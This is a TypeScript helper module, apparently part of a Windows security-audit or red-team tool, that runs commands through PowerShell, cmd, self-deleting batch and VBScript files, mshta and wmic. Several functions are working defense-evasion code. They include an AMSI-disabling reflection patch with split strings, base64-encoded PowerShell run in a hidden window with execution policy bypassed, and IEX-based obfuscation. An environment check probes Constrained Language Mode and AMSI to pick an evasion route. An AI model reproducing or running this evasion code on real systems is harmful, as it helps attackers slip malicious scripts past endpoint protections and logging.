// Types
export type Finding = {
  checkId: string
  provider: string
  severity: string
  status: string
  resource: string
  title: string
  details: string
  remediation: string
  cwe?: string
}
export type HookResult = { output: string; findings: Finding[] }

export type StealthMode = "base64" | "amsi" | "obfuscate"
export let activeStealth: StealthMode | undefined
export let usePwsh = false
export function setStealthState(stealth: StealthMode | undefined, pwsh: boolean) {
  activeStealth = stealth
  usePwsh = pwsh
}

export type ExecMethod = "ps" | "cmd" | "bat" | "wmic" | "vbs" | "mshta" | "auto"
export let activeExec: ExecMethod = "ps"
export function setExecMethod(method: ExecMethod) {
  activeExec = method
}

export type RunResult = { stdout: string; stderr: string; exitCode: number }

export type EnvInfo = {
  psVersion: number
  psAvailable: boolean
  pwshAvailable: boolean
  cmdAvailable: boolean
  wmicAvailable: boolean
  cscriptAvailable: boolean
  mshtaAvailable: boolean
  clmActive: boolean
  amsiActive: boolean
  executionPolicy: string
  isAdmin: boolean
  osBuild: number
  recommendedExec: ExecMethod
}

let cachedEnv: EnvInfo | undefined

// Helpers
export async function run(cmd: string, args: string[], timeout: number): Promise<RunResult> {
  const proc = Bun.spawn([cmd, ...args], { stdout: "pipe", stderr: "pipe", env: { ...process.env } })
  const timer = setTimeout(() => proc.kill(), timeout * 1000)
  const [stdout, stderr] = await Promise.all([new Response(proc.stdout).text(), new Response(proc.stderr).text()])
  clearTimeout(timer)
  return { stdout, stderr, exitCode: await proc.exited }
}

export function toBase64(script: string): string {
  const buf = new TextEncoder().encode(script)
  const utf16 = new Uint8Array(buf.length * 2)
  for (let i = 0; i < buf.length; i++) {
    utf16[i * 2] = buf[i]
    utf16[i * 2 + 1] = 0
  }
  const bin = String.fromCharCode(...utf16)
  return typeof btoa === "function" ? btoa(bin) : Buffer.from(utf16).toString("base64")
}

export function ps(script: string, timeout: number, stealth?: StealthMode) {
  const mode = stealth || activeStealth
  if (!mode) {
    return run(
      usePwsh ? "pwsh.exe" : "powershell.exe",
      ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", script],
      timeout,
    )
  }
  if (mode === "base64") {
    return run(
      usePwsh ? "pwsh.exe" : "powershell.exe",
      [
        "-NoProfile",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-WindowStyle",
        "Hidden",
        "-EncodedCommand",
        toBase64(script),
      ],
      timeout,
    )
  }
  if (mode === "amsi") {
    const patch = `$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$f=$a.GetField('am'+'siInitFailed','NonPublic,Static');$f.SetValue($null,$true);`
    return run(
      usePwsh ? "pwsh.exe" : "powershell.exe",
      [
        "-NoProfile",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-WindowStyle",
        "Hidden",
        "-EncodedCommand",
        toBase64(patch + script),
      ],
      timeout,
    )
  }
  const chunks = script.match(/.{1,60}/g) || [script]
  const vars = chunks.map((c, i) => `$z${i}="${c.replace(/"/g, '`"')}"`).join(";")
  const concat = chunks.map((_, i) => `$z${i}`).join("+")
  const wrapped = `${vars};IEX(${concat})`
  return run(
    usePwsh ? "pwsh.exe" : "powershell.exe",
    [
      "-NoProfile",
      "-NonInteractive",
      "-ExecutionPolicy",
      "Bypass",
      "-WindowStyle",
      "Hidden",
      "-EncodedCommand",
      toBase64(wrapped),
    ],
    timeout,
  )
}

export function cmd(command: string, timeout: number): Promise<RunResult> {
  return run("cmd.exe", ["/c", command], timeout)
}

export function bat(script: string, timeout: number): Promise<RunResult> {
  const batPath = `%TEMP%\\cs_${Date.now()}.bat`
  const wrapped = `@echo off\r\n${script}\r\ndel "%~f0"`
  return run("cmd.exe", ["/c", `echo ${wrapped.replace(/\n/g, "&echo.")} > ${batPath} && ${batPath}`], timeout)
}

export async function batFile(script: string, timeout: number): Promise<RunResult> {
  const id = Math.random().toString(36).slice(2, 8)
  const writeBat = `@echo off\r\n${script}\r\ndel "%~f0"`
  const escapedScript = writeBat.replace(/"/g, '\\"')
  const writeCmd = `cmd.exe /c "echo.${escapedScript}> %TEMP%\\cs_${id}.bat && %TEMP%\\cs_${id}.bat"`
  return run(
    "cmd.exe",
    [
      "/c",
      `(for %i in ("${script.split("\n").join('" "')}") do @echo %~i) > %TEMP%\\cs_${id}.bat && call %TEMP%\\cs_${id}.bat && del %TEMP%\\cs_${id}.bat`,
    ],
    timeout,
  )
}

export function wmic(query: string, timeout: number): Promise<RunResult> {
  return run("wmic.exe", query.split(" "), timeout)
}

export function vbs(script: string, timeout: number): Promise<RunResult> {
  const id = Math.random().toString(36).slice(2, 8)
  const vbsPath = `%TEMP%\\cs_${id}.vbs`
  const cleanupLine = `CreateObject("Scripting.FileSystemObject").DeleteFile WScript.ScriptFullName`
  const fullScript = `${script}\r\n${cleanupLine}`
  const writeAndRun = `(for %i in ("${fullScript.split("\n").join('" "')}") do @echo %~i) > ${vbsPath} && cscript //nologo //e:vbscript ${vbsPath}`
  return run("cmd.exe", ["/c", writeAndRun], timeout)
}

export function mshta(script: string, timeout: number): Promise<RunResult> {
  return run("mshta.exe", [`javascript:${script};close()`], timeout)
}

export async function detectEnv(timeout: number): Promise<EnvInfo> {
  if (cachedEnv) return cachedEnv

  const detection = `
$info = @{}
$info.psVersion = $PSVersionTable.PSVersion.Major
$info.clm = ($ExecutionContext.SessionState.LanguageMode -ne 'FullLanguage')
$info.policy = (Get-ExecutionPolicy).ToString()
$info.admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
$info.build = [System.Environment]::OSVersion.Version.Build
try { $info.amsi = [bool]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')) } catch { $info.amsi = $false }
$info | ConvertTo-Json -Compress
`
  const psResult = await run(
    "powershell.exe",
    ["-NoProfile", "-NonInteractive", "-ExecutionPolicy", "Bypass", "-Command", detection],
    timeout,
  ).catch(() => ({ stdout: "", stderr: "", exitCode: 1 }))

  let psVersion = 0
  let clmActive = false
  let amsiActive = false
  let executionPolicy = "unknown"
  let isAdmin = false
  let osBuild = 0
  const psAvailable = psResult.exitCode === 0

  if (psAvailable && psResult.stdout.trim()) {
    try {
      const info = JSON.parse(psResult.stdout.trim())
      psVersion = info.psVersion || 0
      clmActive = info.clm || false
      amsiActive = info.amsi || false
      executionPolicy = info.policy || "unknown"
      isAdmin = info.admin || false
      osBuild = info.build || 0
    } catch {
      // JSON parse failed — PS available but output mangled
    }
  }

  const pwshResult = await run("pwsh.exe", ["--version"], timeout).catch(() => ({
    exitCode: 1,
    stdout: "",
    stderr: "",
  }))
  const wmicResult = await run("wmic.exe", ["os", "get", "caption", "/format:list"], timeout).catch(() => ({
    exitCode: 1,
    stdout: "",
    stderr: "",
  }))
  const cscriptResult = await run("cscript.exe", ["//nologo", "//?"], timeout).catch(() => ({
    exitCode: 1,
    stdout: "",
    stderr: "",
  }))
  const mshtaResult = await run("where.exe", ["mshta.exe"], timeout).catch(() => ({
    exitCode: 1,
    stdout: "",
    stderr: "",
  }))

  const pwshAvailable = pwshResult.exitCode === 0
  const cmdAvailable = true
  const wmicAvailable = wmicResult.exitCode === 0
  const cscriptAvailable = cscriptResult.exitCode === 0 || cscriptResult.stderr.includes("cscript")
  const mshtaAvailable = mshtaResult.exitCode === 0

  let recommendedExec: ExecMethod = "ps"
  if (!psAvailable) recommendedExec = "cmd"
  if (psAvailable && clmActive && psVersion >= 2) recommendedExec = "cmd"
  if (psAvailable && clmActive && wmicAvailable) recommendedExec = "wmic"

  cachedEnv = {
    psVersion,
    psAvailable,
    pwshAvailable,
    cmdAvailable,
    wmicAvailable,
    cscriptAvailable,
    mshtaAvailable,
    clmActive,
    amsiActive,
    executionPolicy,
    isAdmin,
    osBuild,
    recommendedExec,
  }
  return cachedEnv
}

export function resetEnvCache() {
  cachedEnv = undefined
}

export function resolveExec(requested: ExecMethod, env?: EnvInfo): ExecMethod {
  if (requested !== "auto") return requested
  if (!env) return activeExec !== "auto" ? activeExec : "ps"
  if (env.psAvailable && !env.clmActive) return "ps"
  if (env.psAvailable && env.clmActive && env.psVersion === 2) return "ps"
  if (env.wmicAvailable) return "wmic"
  return "cmd"
}

export function argVal(args: string[], flag: string): string | undefined {
  const i = args.indexOf(flag)
  return i >= 0 && i + 1 < args.length ? args[i + 1] : undefined
}

export function hasFlag(args: string[], flag: string): boolean {
  return args.includes(flag)
}
